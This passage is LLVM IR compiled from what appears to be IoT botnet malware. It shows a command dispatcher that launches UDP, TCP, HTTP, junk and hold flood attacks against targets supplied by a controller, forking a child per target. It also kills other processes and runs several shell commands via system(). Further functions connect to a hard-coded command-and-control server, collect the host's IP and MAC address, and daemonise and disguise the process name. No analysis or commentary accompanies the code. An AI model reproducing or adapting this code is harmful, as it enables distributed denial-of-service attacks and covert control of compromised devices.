  %89 = tail call i32 @atoi(i8* %88) #15
  %90 = icmp slt i32 %89, 1
  br i1 %90, label %347, label %91

; <label>:91:                                     ; preds = %86
  %92 = getelementptr inbounds i8*, i8** %1, i64 3
  %93 = load i8*, i8** %92, align 8
  %94 = tail call i32 @atoi(i8* %93) #15
  %95 = icmp slt i32 %94, 1
  br i1 %95, label %347, label %96

; <label>:96:                                     ; preds = %91
  %97 = getelementptr inbounds i8*, i8** %1, i64 1
  %98 = load i8*, i8** %97, align 8
  %strchr165 = tail call i8* @strchr(i8* %98, i32 44)
  %99 = icmp eq i8* %strchr165, null
  br i1 %99, label %108, label %.preheader183.preheader

.preheader183.preheader:                          ; preds = %96
  br label %.preheader183

.preheader183:                                    ; preds = %.preheader183.preheader, %102
  %.sink170 = phi i8* [ null, %102 ], [ %98, %.preheader183.preheader ]
  %100 = tail call i8* @strtok(i8* %.sink170, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.84, i64 0, i64 0)) #3
  %101 = icmp eq i8* %100, null
  br i1 %101, label %.loopexit184.loopexit, label %102

; <label>:102:                                    ; preds = %.preheader183
  %103 = tail call i32 @listFork()
  %104 = icmp eq i32 %103, 0
  br i1 %104, label %105, label %.preheader183

; <label>:105:                                    ; preds = %102
  tail call void @sendJUNK(i8* nonnull %100, i32 %89, i32 %94)
  %106 = load i32, i32* @mainCommSock, align 4
  %107 = tail call i32 @close(i32 %106) #3
  tail call void @_exit(i32 0) #17
  unreachable

; <label>:108:                                    ; preds = %96
  %109 = tail call i32 @listFork()
  %110 = icmp eq i32 %109, 0
  br i1 %110, label %111, label %347

; <label>:111:                                    ; preds = %108
  tail call void @sendJUNK(i8* %98, i32 %89, i32 %94)
  tail call void @_exit(i32 0) #17
  unreachable

.loopexit184.loopexit:                            ; preds = %.preheader183
  %.pre205 = load i8*, i8** %1, align 8
  br label %.loopexit184

.loopexit184:                                     ; preds = %.loopexit184.loopexit, %.loopexit186
  %112 = phi i8* [ %.pre205, %.loopexit184.loopexit ], [ %81, %.loopexit186 ]
  %113 = tail call i32 @strcmp(i8* %112, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.101, i64 0, i64 0)) #15
  %114 = icmp eq i32 %113, 0
  br i1 %114, label %115, label %.loopexit182

; <label>:115:                                    ; preds = %.loopexit184
  %116 = icmp slt i32 %0, 6
  br i1 %116, label %347, label %117

; <label>:117:                                    ; preds = %115
  %118 = getelementptr inbounds i8*, i8** %1, i64 3
  %119 = load i8*, i8** %118, align 8
  %120 = tail call i32 @atoi(i8* %119) #15
  %121 = icmp eq i32 %120, -1
  br i1 %121, label %347, label %122

; <label>:122:                                    ; preds = %117
  %123 = getelementptr inbounds i8*, i8** %1, i64 2
  %124 = load i8*, i8** %123, align 8
  %125 = tail call i32 @atoi(i8* %124) #15
  %126 = icmp eq i32 %125, -1
  br i1 %126, label %347, label %127

; <label>:127:                                    ; preds = %122
  %128 = getelementptr inbounds i8*, i8** %1, i64 4
  %129 = load i8*, i8** %128, align 8
  %130 = tail call i32 @atoi(i8* %129) #15
  %131 = icmp eq i32 %130, -1
  %132 = icmp sgt i32 %130, 1024
  %or.cond = or i1 %131, %132
  br i1 %or.cond, label %347, label %133

; <label>:133:                                    ; preds = %127
  %134 = icmp eq i32 %0, 6
  br i1 %134, label %135, label %140

; <label>:135:                                    ; preds = %133
  %136 = getelementptr inbounds i8*, i8** %1, i64 5
  %137 = load i8*, i8** %136, align 8
  %138 = tail call i32 @atoi(i8* %137) #15
  %139 = icmp slt i32 %138, 1
  br i1 %139, label %347, label %140

; <label>:140:                                    ; preds = %135, %133
  %141 = getelementptr inbounds i8*, i8** %1, i64 1
  %142 = load i8*, i8** %141, align 8
  %143 = tail call i32 @atoi(i8* %124) #15
  %144 = tail call i32 @atoi(i8* %119) #15
  %145 = tail call i32 @atoi(i8* %129) #15
  br i1 %134, label %146, label %150

; <label>:146:                                    ; preds = %140
  %147 = getelementptr inbounds i8*, i8** %1, i64 5
  %148 = load i8*, i8** %147, align 8
  %149 = tail call i32 @atoi(i8* %148) #15
  br label %150

; <label>:150:                                    ; preds = %140, %146
  %151 = phi i32 [ %149, %146 ], [ 10, %140 ]
  %strchr166 = tail call i8* @strchr(i8* %142, i32 44)
  %152 = icmp eq i8* %strchr166, null
  br i1 %152, label %159, label %.preheader181.preheader

.preheader181.preheader:                          ; preds = %150
  br label %.preheader181

.preheader181:                                    ; preds = %.preheader181.preheader, %155
  %.sink171 = phi i8* [ null, %155 ], [ %142, %.preheader181.preheader ]
  %153 = tail call i8* @strtok(i8* %.sink171, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.84, i64 0, i64 0)) #3
  %154 = icmp eq i8* %153, null
  br i1 %154, label %.loopexit182.loopexit, label %155

; <label>:155:                                    ; preds = %.preheader181
  %156 = tail call i32 @listFork()
  %157 = icmp eq i32 %156, 0
  br i1 %157, label %158, label %.preheader181

; <label>:158:                                    ; preds = %155
  tail call void @sendUDP(i8* nonnull %153, i32 %143, i32 %144, i32 %145, i32 %151, i32 32)
  tail call void @_exit(i32 0) #17
  unreachable

; <label>:159:                                    ; preds = %150
  %160 = tail call i32 @listFork()
  %161 = icmp eq i32 %160, 0
  br i1 %161, label %162, label %347

; <label>:162:                                    ; preds = %159
  tail call void @sendUDP(i8* %142, i32 %143, i32 %144, i32 %145, i32 %151, i32 32)
  tail call void @_exit(i32 0) #17
  unreachable

.loopexit182.loopexit:                            ; preds = %.preheader181
  %.pre206 = load i8*, i8** %1, align 8
  br label %.loopexit182

.loopexit182:                                     ; preds = %.loopexit182.loopexit, %.loopexit184
  %163 = phi i8* [ %.pre206, %.loopexit182.loopexit ], [ %112, %.loopexit184 ]
  %164 = tail call i32 @strcmp(i8* %163, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.102, i64 0, i64 0)) #15
  %165 = icmp eq i32 %164, 0
  br i1 %165, label %166, label %196

; <label>:166:                                    ; preds = %.loopexit182
  %167 = icmp slt i32 %0, 6
  br i1 %167, label %347, label %168

; <label>:168:                                    ; preds = %166
  %169 = getelementptr inbounds i8*, i8** %1, i64 3
  %170 = load i8*, i8** %169, align 8
  %171 = tail call i32 @atoi(i8* %170) #15
  %172 = icmp slt i32 %171, 1
  br i1 %172, label %347, label %173

; <label>:173:                                    ; preds = %168
  %174 = getelementptr inbounds i8*, i8** %1, i64 5
  %175 = load i8*, i8** %174, align 8
  %176 = tail call i32 @atoi(i8* %175) #15
  %177 = icmp slt i32 %176, 1
  br i1 %177, label %347, label %178

; <label>:178:                                    ; preds = %173
  %179 = tail call i32 @listFork()
  %180 = icmp eq i32 %179, 0
  br i1 %180, label %181, label %347

; <label>:181:                                    ; preds = %178
  %182 = getelementptr inbounds i8*, i8** %1, i64 1
  %183 = load i8*, i8** %182, align 8
  %184 = getelementptr inbounds i8*, i8** %1, i64 2
  %185 = load i8*, i8** %184, align 8
  %186 = load i8*, i8** %169, align 8
  %187 = tail call i32 @atoi(i8* %186) #15
  %188 = trunc i32 %187 to i16
  %189 = getelementptr inbounds i8*, i8** %1, i64 4
  %190 = load i8*, i8** %189, align 8
  %191 = load i8*, i8** %174, align 8
  %192 = tail call i32 @atoi(i8* %191) #15
  %193 = getelementptr inbounds i8*, i8** %1, i64 6
  %194 = load i8*, i8** %193, align 8
  %195 = tail call i32 @atoi(i8* %194) #15
  tail call void @sendHTTP(i8* %183, i8* %185, i16 zeroext %188, i8* %190, i32 %192, i32 %195)
  tail call void @exit(i32 0) #17
  unreachable

; <label>:196:                                    ; preds = %.loopexit182
  %197 = tail call i32 @strcmp(i8* %163, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.103, i64 0, i64 0)) #15
  %198 = icmp eq i32 %197, 0
  br i1 %198, label %199, label %.loopexit180

; <label>:199:                                    ; preds = %196
  %200 = icmp slt i32 %0, 4
  br i1 %200, label %347, label %201

; <label>:201:                                    ; preds = %199
  %202 = getelementptr inbounds i8*, i8** %1, i64 2
  %203 = load i8*, i8** %202, align 8
  %204 = tail call i32 @atoi(i8* %203) #15
  %205 = icmp slt i32 %204, 1
  br i1 %205, label %347, label %206

; <label>:206:                                    ; preds = %201
  %207 = getelementptr inbounds i8*, i8** %1, i64 3
  %208 = load i8*, i8** %207, align 8
  %209 = tail call i32 @atoi(i8* %208) #15
  %210 = icmp slt i32 %209, 1
  br i1 %210, label %347, label %211

; <label>:211:                                    ; preds = %206
  %212 = getelementptr inbounds i8*, i8** %1, i64 1
  %213 = load i8*, i8** %212, align 8
  %strchr167 = tail call i8* @strchr(i8* %213, i32 44)
  %214 = icmp eq i8* %strchr167, null
  br i1 %214, label %223, label %.preheader179.preheader

.preheader179.preheader:                          ; preds = %211
  br label %.preheader179

.preheader179:                                    ; preds = %.preheader179.preheader, %217
  %.sink172 = phi i8* [ null, %217 ], [ %213, %.preheader179.preheader ]
  %215 = tail call i8* @strtok(i8* %.sink172, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.84, i64 0, i64 0)) #3
  %216 = icmp eq i8* %215, null
  br i1 %216, label %.loopexit180.loopexit, label %217

; <label>:217:                                    ; preds = %.preheader179
  %218 = tail call i32 @listFork()
  %219 = icmp eq i32 %218, 0
  br i1 %219, label %220, label %.preheader179

; <label>:220:                                    ; preds = %217
  tail call void @sendCNC(i8* nonnull %215, i32 %204, i32 %209)
  %221 = load i32, i32* @mainCommSock, align 4
  %222 = tail call i32 @close(i32 %221) #3
  tail call void @_exit(i32 0) #17
  unreachable

; <label>:223:                                    ; preds = %211
  %224 = tail call i32 @listFork()
  %225 = icmp eq i32 %224, 0
  br i1 %225, label %226, label %347

; <label>:226:                                    ; preds = %223
  tail call void @sendCNC(i8* %213, i32 %204, i32 %209)
  tail call void @_exit(i32 0) #17
  unreachable

.loopexit180.loopexit:                            ; preds = %.preheader179
  %.pre207 = load i8*, i8** %1, align 8
  br label %.loopexit180

.loopexit180:                                     ; preds = %.loopexit180.loopexit, %196
  %227 = phi i8* [ %.pre207, %.loopexit180.loopexit ], [ %163, %196 ]
  %228 = tail call i32 @strcmp(i8* %227, i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.104, i64 0, i64 0)) #15
  %229 = icmp eq i32 %228, 0
  br i1 %229, label %230, label %.loopexit178

; <label>:230:                                    ; preds = %.loopexit180
  %231 = icmp slt i32 %0, 4
  br i1 %231, label %347, label %232

; <label>:232:                                    ; preds = %230
  %233 = getelementptr inbounds i8*, i8** %1, i64 2
  %234 = load i8*, i8** %233, align 8
  %235 = tail call i32 @atoi(i8* %234) #15
  %236 = icmp slt i32 %235, 1
  br i1 %236, label %347, label %237

; <label>:237:                                    ; preds = %232
  %238 = getelementptr inbounds i8*, i8** %1, i64 3
  %239 = load i8*, i8** %238, align 8
  %240 = tail call i32 @atoi(i8* %239) #15
  %241 = icmp slt i32 %240, 1
  br i1 %241, label %347, label %242

; <label>:242:                                    ; preds = %237
  %243 = getelementptr inbounds i8*, i8** %1, i64 1
  %244 = load i8*, i8** %243, align 8
  %strchr168 = tail call i8* @strchr(i8* %244, i32 44)
  %245 = icmp eq i8* %strchr168, null
  br i1 %245, label %254, label %.preheader177.preheader

.preheader177.preheader:                          ; preds = %242
  br label %.preheader177

.preheader177:                                    ; preds = %.preheader177.preheader, %248
  %.sink173 = phi i8* [ null, %248 ], [ %244, %.preheader177.preheader ]
  %246 = tail call i8* @strtok(i8* %.sink173, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.84, i64 0, i64 0)) #3
  %247 = icmp eq i8* %246, null
  br i1 %247, label %.loopexit178.loopexit, label %248

; <label>:248:                                    ; preds = %.preheader177
  %249 = tail call i32 @listFork()
  %250 = icmp eq i32 %249, 0
  br i1 %250, label %251, label %.preheader177

; <label>:251:                                    ; preds = %248
  tail call void @sendJUNK(i8* nonnull %246, i32 %235, i32 %240)
  tail call void @sendHOLD(i8* nonnull %246, i32 %235, i32 %240)
  %252 = load i32, i32* @mainCommSock, align 4
  %253 = tail call i32 @close(i32 %252) #3
  tail call void @_exit(i32 0) #17
  unreachable

; <label>:254:                                    ; preds = %242
  %255 = tail call i32 @listFork()
  %256 = icmp eq i32 %255, 0
  br i1 %256, label %257, label %347

; <label>:257:                                    ; preds = %254
  tail call void @sendJUNK(i8* %244, i32 %235, i32 %240)
  tail call void @sendHOLD(i8* %244, i32 %235, i32 %240)
  tail call void @_exit(i32 0) #17
  unreachable

.loopexit178.loopexit:                            ; preds = %.preheader177
  %.pre208 = load i8*, i8** %1, align 8
  br label %.loopexit178

.loopexit178:                                     ; preds = %.loopexit178.loopexit, %.loopexit180
  %258 = phi i8* [ %.pre208, %.loopexit178.loopexit ], [ %227, %.loopexit180 ]
  %259 = tail call i32 @strcmp(i8* %258, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.105, i64 0, i64 0)) #15
  %260 = icmp eq i32 %259, 0
  br i1 %260, label %261, label %.loopexit176

; <label>:261:                                    ; preds = %.loopexit178
  %262 = icmp slt i32 %0, 6
  br i1 %262, label %347, label %263

; <label>:263:                                    ; preds = %261
  %264 = getelementptr inbounds i8*, i8** %1, i64 3
  %265 = load i8*, i8** %264, align 8
  %266 = tail call i32 @atoi(i8* %265) #15
  %267 = icmp eq i32 %266, -1
  br i1 %267, label %347, label %268

; <label>:268:                                    ; preds = %263
  %269 = getelementptr inbounds i8*, i8** %1, i64 2
  %270 = load i8*, i8** %269, align 8
  %271 = tail call i32 @atoi(i8* %270) #15
  %272 = icmp eq i32 %271, -1
  br i1 %272, label %347, label %273

; <label>:273:                                    ; preds = %268
  %274 = getelementptr inbounds i8*, i8** %1, i64 5
  %275 = load i8*, i8** %274, align 8
  %276 = tail call i32 @atoi(i8* %275) #15
  %277 = icmp slt i32 %276, 0
  br i1 %277, label %347, label %278

; <label>:278:                                    ; preds = %273
  %279 = icmp eq i32 %0, 7
  br i1 %279, label %280, label %285

; <label>:280:                                    ; preds = %278
  %281 = getelementptr inbounds i8*, i8** %1, i64 6
  %282 = load i8*, i8** %281, align 8
  %283 = tail call i32 @atoi(i8* %282) #15
  %284 = icmp slt i32 %283, 1
  br i1 %284, label %347, label %285

; <label>:285:                                    ; preds = %280, %278
  %286 = getelementptr inbounds i8*, i8** %1, i64 1
  %287 = load i8*, i8** %286, align 8
  %288 = tail call i32 @atoi(i8* %270) #15
  %289 = tail call i32 @atoi(i8* %265) #15
  %290 = getelementptr inbounds i8*, i8** %1, i64 4
  %291 = load i8*, i8** %290, align 8
  br i1 %279, label %292, label %296

; <label>:292:                                    ; preds = %285
  %293 = getelementptr inbounds i8*, i8** %1, i64 6
  %294 = load i8*, i8** %293, align 8
  %295 = tail call i32 @atoi(i8* %294) #15
  br label %296

; <label>:296:                                    ; preds = %285, %292
  %297 = phi i32 [ %295, %292 ], [ 10, %285 ]
  %298 = tail call i32 @atoi(i8* %275) #15
  %strchr169 = tail call i8* @strchr(i8* %287, i32 44)
  %299 = icmp eq i8* %strchr169, null
  br i1 %299, label %306, label %.preheader175.preheader

.preheader175.preheader:                          ; preds = %296
  br label %.preheader175

.preheader175:                                    ; preds = %.preheader175.preheader, %302
  %.sink174 = phi i8* [ null, %302 ], [ %287, %.preheader175.preheader ]
  %300 = tail call i8* @strtok(i8* %.sink174, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.84, i64 0, i64 0)) #3
  %301 = icmp eq i8* %300, null
  br i1 %301, label %.loopexit176.loopexit, label %302

; <label>:302:                                    ; preds = %.preheader175
  %303 = tail call i32 @listFork()
  %304 = icmp eq i32 %303, 0
  br i1 %304, label %305, label %.preheader175

; <label>:305:                                    ; preds = %302
  tail call void @sendTCP(i8* nonnull %300, i32 %288, i32 %289, i8* %291, i32 %298, i32 %297, i32 32)
  tail call void @_exit(i32 0) #17
  unreachable

; <label>:306:                                    ; preds = %296
  %307 = tail call i32 @listFork()
  %308 = icmp eq i32 %307, 0
  br i1 %308, label %309, label %347

; <label>:309:                                    ; preds = %306
  tail call void @sendTCP(i8* %287, i32 %288, i32 %289, i8* %291, i32 %298, i32 %297, i32 32)
  tail call void @_exit(i32 0) #17
  unreachable

.loopexit176.loopexit:                            ; preds = %.preheader175
  %.pre209 = load i8*, i8** %1, align 8
  br label %.loopexit176

.loopexit176:                                     ; preds = %.loopexit176.loopexit, %.loopexit178
  %310 = phi i8* [ %.pre209, %.loopexit176.loopexit ], [ %258, %.loopexit178 ]
  %311 = tail call i32 @strcmp(i8* %310, i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.106, i64 0, i64 0)) #15
  %312 = icmp eq i32 %311, 0
  %313 = load i64, i64* @numpids, align 8
  %314 = icmp ne i64 %313, 0
  %or.cond196 = and i1 %312, %314
  br i1 %or.cond196, label %.lr.ph.preheader, label %.loopexit

.lr.ph.preheader:                                 ; preds = %.loopexit176
  br label %.lr.ph

.lr.ph:                                           ; preds = %.lr.ph.preheader, %327
  %.0194 = phi i64 [ %328, %327 ], [ 0, %.lr.ph.preheader ]
  %315 = load i32*, i32** @pids, align 8
  %316 = getelementptr inbounds i32, i32* %315, i64 %.0194
  %317 = load i32, i32* %316, align 4
  %318 = icmp eq i32 %317, 0
  br i1 %318, label %327, label %319

; <label>:319:                                    ; preds = %.lr.ph
  %320 = tail call i32 @getpid() #3
  %321 = icmp eq i32 %317, %320
  br i1 %321, label %327, label %322

; <label>:322:                                    ; preds = %319
  %323 = load i32*, i32** @pids, align 8
  %324 = getelementptr inbounds i32, i32* %323, i64 %.0194
  %325 = load i32, i32* %324, align 4
  %326 = tail call i32 @kill(i32 %325, i32 9) #3
  br label %327

; <label>:327:                                    ; preds = %319, %.lr.ph, %322
  %328 = add i64 %.0194, 1
  %329 = load i64, i64* @numpids, align 8
  %330 = icmp ult i64 %328, %329
  br i1 %330, label %.lr.ph, label %.loopexit.loopexit

.loopexit.loopexit:                               ; preds = %327
  %.pre210 = load i8*, i8** %1, align 8
  br label %.loopexit

.loopexit:                                        ; preds = %.loopexit.loopexit, %.loopexit176
  %331 = phi i8* [ %.pre210, %.loopexit.loopexit ], [ %310, %.loopexit176 ]
  %332 = tail call i32 @strcmp(i8* %331, i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.107, i64 0, i64 0)) #15
  %333 = icmp eq i32 %332, 0
  br i1 %333, label %334, label %335

; <label>:334:                                    ; preds = %.loopexit
  tail call void @exit(i32 0) #17
  unreachable

; <label>:335:                                    ; preds = %.loopexit
  %336 = tail call i32 @strcmp(i8* %331, i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.108, i64 0, i64 0)) #15
  %337 = icmp eq i32 %336, 0
  br i1 %337, label %338, label %347

; <label>:338:                                    ; preds = %335
  %339 = tail call i32 @system(i8* getelementptr inbounds ([21 x i8], [21 x i8]* @.str.109, i64 0, i64 0)) #3
  %340 = tail call i32 @system(i8* getelementptr inbounds ([14 x i8], [14 x i8]* @.str.110, i64 0, i64 0)) #3
  %341 = tail call i32 @system(i8* getelementptr inbounds ([11 x i8], [11 x i8]* @.str.111, i64 0, i64 0)) #3
  %342 = tail call i32 @system(i8* getelementptr inbounds ([23 x i8], [23 x i8]* @.str.112, i64 0, i64 0)) #3
  %343 = tail call i32 @system(i8* getelementptr inbounds ([20 x i8], [20 x i8]* @.str.113, i64 0, i64 0)) #3
  %344 = tail call i32 @system(i8* getelementptr inbounds ([11 x i8], [11 x i8]* @.str.114, i64 0, i64 0)) #3
  %345 = tail call i32 @system(i8* getelementptr inbounds ([16 x i8], [16 x i8]* @.str.115, i64 0, i64 0)) #3
  %346 = tail call i32 @system(i8* getelementptr inbounds ([22 x i8], [22 x i8]* @.str.116, i64 0, i64 0)) #3
  br label %347

; <label>:347:                                    ; preds = %335, %306, %254, %223, %178, %159, %108, %77, %41, %261, %263, %268, %273, %280, %230, %232, %237, %199, %201, %206, %166, %168, %173, %115, %117, %122, %127, %135, %84, %86, %91, %55, %57, %62, %30, %338, %47, %22, %12, %6
  ret void
}

; Function Attrs: nounwind
declare i32 @kill(i32, i32) local_unnamed_addr #5

; Function Attrs: nounwind readonly
declare i32 @atoi(i8* nocapture) local_unnamed_addr #2

; Function Attrs: nounwind
declare i32 @getpid() local_unnamed_addr #5

; Function Attrs: noinline nounwind uwtable
define i32 @initConnection() local_unnamed_addr #1 {
  %1 = alloca [4096 x i8], align 16
  %2 = getelementptr inbounds [4096 x i8], [4096 x i8]* %1, i64 0, i64 0
  call void @llvm.memset.p0i8.i64(i8* nonnull %2, i8 0, i64 4096, i32 16, i1 false)
  %3 = load i32, i32* @mainCommSock, align 4
  %4 = icmp eq i32 %3, 0
  br i1 %4, label %7, label %5

; <label>:5:                                      ; preds = %0
  %6 = tail call i32 @close(i32 %3) #3
  store i32 0, i32* @mainCommSock, align 4
  br label %7

; <label>:7:                                      ; preds = %0, %5
  %8 = load i32, i32* @currentServer, align 4
  %9 = add nsw i32 %8, 1
  %10 = icmp eq i32 %8, 0
  %.sink = select i1 %10, i32 0, i32 %9
  store i32 %.sink, i32* @currentServer, align 4
  %11 = sext i32 %.sink to i64
  %12 = getelementptr inbounds [1 x i8*], [1 x i8*]* @commServer, i64 0, i64 %11
  %13 = load i8*, i8** %12, align 8
  %14 = call i8* @strcpy(i8* nonnull %2, i8* %13) #3
  %15 = call i8* @strchr(i8* nonnull %2, i32 58) #15
  %16 = icmp eq i8* %15, null
  br i1 %16, label %20, label %17

; <label>:17:                                     ; preds = %7
  %18 = getelementptr inbounds i8, i8* %15, i64 1
  %19 = call i32 @atoi(i8* %18) #15
  store i8 0, i8* %15, align 1
  br label %20

; <label>:20:                                     ; preds = %7, %17
  %.0 = phi i32 [ %19, %17 ], [ 23, %7 ]
  %21 = call i32 @socket(i32 2, i32 1, i32 0) #3
  store i32 %21, i32* @mainCommSock, align 4
  %22 = call i32 @connectTimeout(i32 %21, i8* nonnull %2, i32 %.0, i32 30)
  %23 = icmp eq i32 %22, 0
  %. = zext i1 %23 to i32
  ret i32 %.
}

; Function Attrs: noinline nounwind uwtable
define i32 @getOurIP() local_unnamed_addr #1 {
  %1 = alloca %struct.sockaddr_in, align 4
  %2 = alloca %struct.sockaddr_in, align 4
  %3 = alloca i32, align 4
  %4 = alloca [4096 x i8], align 16
  %5 = alloca %struct.ifreq, align 8
  %6 = tail call i32 @socket(i32 2, i32 2, i32 0) #3
  %7 = icmp eq i32 %6, -1
  br i1 %7, label %46, label %8

; <label>:8:                                      ; preds = %0
  %9 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %1, i64 0, i32 3, i64 0
  %10 = bitcast i8* %9 to i64*
  store i64 0, i64* %10, align 4
  %11 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %1, i64 0, i32 0
  store i16 2, i16* %11, align 4
  %12 = tail call i32 @inet_addr(i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.117, i64 0, i64 0)) #3
  %13 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %1, i64 0, i32 2, i32 0
  store i32 %12, i32* %13, align 4
  %14 = tail call zeroext i16 @htons(i16 zeroext 53) #18
  %15 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %1, i64 0, i32 1
  store i16 %14, i16* %15, align 2
  %16 = bitcast %struct.sockaddr_in* %1 to %struct.sockaddr*
  %17 = call i32 @connect(i32 %6, %struct.sockaddr* nonnull %16, i32 16) #3
  %18 = icmp eq i32 %17, -1
  br i1 %18, label %46, label %19

; <label>:19:                                     ; preds = %8
  store i32 16, i32* %3, align 4
  %20 = bitcast %struct.sockaddr_in* %2 to %struct.sockaddr*
  %21 = call i32 @getsockname(i32 %6, %struct.sockaddr* nonnull %20, i32* nonnull %3) #3
  %22 = icmp eq i32 %21, -1
  br i1 %22, label %46, label %23

; <label>:23:                                     ; preds = %19
  %24 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %2, i64 0, i32 2, i32 0
  %25 = load i32, i32* %24, align 4
  store i32 %25, i32* getelementptr inbounds (%struct.in_addr, %struct.in_addr* @ourIP, i64 0, i32 0), align 4
  %26 = call i32 (i8*, i32, ...) @open(i8* getelementptr inbounds ([16 x i8], [16 x i8]* @.str.118, i64 0, i64 0), i32 0) #3
  %27 = getelementptr inbounds [4096 x i8], [4096 x i8]* %4, i64 0, i64 0
  %28 = call i8* @fdgets(i8* nonnull %27, i32 4096, i32 %26)
  %29 = icmp eq i8* %28, null
  br i1 %29, label %.loopexit17, label %.lr.ph.preheader

.lr.ph.preheader:                                 ; preds = %23
  br label %.lr.ph

.lr.ph:                                           ; preds = %.lr.ph.preheader, %36
  %30 = call i8* @strstr(i8* nonnull %27, i8* getelementptr inbounds ([11 x i8], [11 x i8]* @.str.119, i64 0, i64 0)) #15
  %31 = icmp eq i8* %30, null
  br i1 %31, label %36, label %.preheader.preheader

.preheader.preheader:                             ; preds = %.lr.ph
  br label %.preheader

.preheader:                                       ; preds = %.preheader.preheader, %.preheader
  %.015 = phi i8* [ %34, %.preheader ], [ %27, %.preheader.preheader ]
  %32 = load i8, i8* %.015, align 1
  %33 = icmp eq i8 %32, 9
  %34 = getelementptr inbounds i8, i8* %.015, i64 1
  br i1 %33, label %35, label %.preheader

; <label>:35:                                     ; preds = %.preheader
  store i8 0, i8* %.015, align 1
  br label %.loopexit17

; <label>:36:                                     ; preds = %.lr.ph
  call void @llvm.memset.p0i8.i64(i8* nonnull %27, i8 0, i64 4096, i32 16, i1 false)
  %37 = call i8* @fdgets(i8* nonnull %27, i32 4096, i32 %26)
  %38 = icmp eq i8* %37, null
  br i1 %38, label %.loopexit17.loopexit, label %.lr.ph

.loopexit17.loopexit:                             ; preds = %36
  br label %.loopexit17

.loopexit17:                                      ; preds = %.loopexit17.loopexit, %23, %35
  %39 = call i32 @close(i32 %26) #3
  %40 = load i8, i8* %27, align 16
  %41 = icmp eq i8 %40, 0
  br i1 %41, label %.loopexit, label %.loopexit.loopexit

.loopexit.loopexit:                               ; preds = %.loopexit17
  %42 = getelementptr inbounds %struct.ifreq, %struct.ifreq* %5, i64 0, i32 0, i32 0, i64 0
  %43 = call i8* @strcpy(i8* nonnull %42, i8* nonnull %27) #3
  %44 = call i32 (i32, i64, ...) @ioctl(i32 %6, i64 35111, %struct.ifreq* nonnull %5) #3
  %scevgep = getelementptr inbounds %struct.ifreq, %struct.ifreq* %5, i64 0, i32 1, i32 0, i32 0
  %scevgep20 = bitcast i64* %scevgep to i8*
  %uglygep = getelementptr inbounds i8, i8* %scevgep20, i64 2
  call void @llvm.memcpy.p0i8.p0i8.i64(i8* getelementptr inbounds ([6 x i8], [6 x i8]* @macAddress, i64 0, i64 0), i8* %uglygep, i64 6, i32 1, i1 false)
  br label %.loopexit

.loopexit:                                        ; preds = %.loopexit.loopexit, %.loopexit17
  %45 = call i32 @close(i32 %6) #3
  br label %46

; <label>:46:                                     ; preds = %19, %8, %0, %.loopexit
  ret i32 0
}

; Function Attrs: nounwind
declare i32 @getsockname(i32, %struct.sockaddr*, i32*) local_unnamed_addr #5

; Function Attrs: nounwind
declare i32 @ioctl(i32, i64, ...) local_unnamed_addr #5

; Function Attrs: noinline norecurse nounwind readnone uwtable
define i8* @getBuild() local_unnamed_addr #14 {
  ret i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.120, i64 0, i64 0)
}

; Function Attrs: noinline noreturn nounwind uwtable
define i32 @main(i32, i8** nocapture) local_unnamed_addr #12 {
  %3 = alloca i32, align 4
  %4 = alloca [4096 x i8], align 16
  %5 = alloca [1024 x i8], align 16
  %6 = alloca [10 x i8*], align 16
  %7 = tail call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([10 x i8], [10 x i8]* @.str.122, i64 0, i64 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.120, i64 0, i64 0))
  %8 = load i8*, i8** %1, align 8
  %9 = tail call i64 @strlen(i8* %8) #15
  tail call void @llvm.memset.p0i8.i64(i8* %8, i8 0, i64 %9, i32 1, i1 false)
  store i8* getelementptr inbounds ([19 x i8], [19 x i8]* @.str.121, i64 0, i64 0), i8** %1, align 8
  %10 = tail call i32 (i32, i64, i32, i32, i32, ...) bitcast (i32 (...)* @prctl to i32 (i32, i64, i32, i32, i32, ...)*)(i32 15, i64 ptrtoint ([19 x i8]* @.str.121 to i64), i32 0, i32 0, i32 0) #3
  %11 = tail call i32 (i8*, ...) bitcast (i32 (...)* @time to i32 (i8*, ...)*)(i8* null) #3
  %12 = tail call i32 @getpid() #3
  %13 = xor i32 %12, %11
  tail call void @srand(i32 %13) #3
  %14 = tail call i32 (i8*, ...) bitcast (i32 (...)* @time to i32 (i8*, ...)*)(i8* null) #3
  %15 = tail call i32 @getpid() #3
  %16 = xor i32 %15, %14
  tail call void @init_rand(i32 %16)
  %17 = tail call i32 @getOurIP()
  %18 = tail call i32 @fork() #3
  %19 = icmp eq i32 %18, 0
  br i1 %19, label %22, label %20

; <label>:20:                                     ; preds = %2
  %21 = call i32 @waitpid(i32 %18, i32* nonnull %3, i32 0) #3
  call void @exit(i32 0) #17
  unreachable

; <label>:22:                                     ; preds = %2
  %23 = tail call i32 @fork() #3
  %24 = icmp eq i32 %23, 0
  br i1 %24, label %26, label %25

; <label>:25:                                     ; preds = %22
  tail call void @exit(i32 0) #17
  unreachable

; <label>:26:                                     ; preds = %22
  %27 = tail call i32 @setsid() #3
  %28 = tail call i32 @chdir(i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.124, i64 0, i64 0)) #3
  %29 = tail call void (i32)* @signal(i32 13, void (i32)* inttoptr (i64 1 to void (i32)*)) #3
  %30 = getelementptr inbounds [4096 x i8], [4096 x i8]* %4, i64 0, i64 0
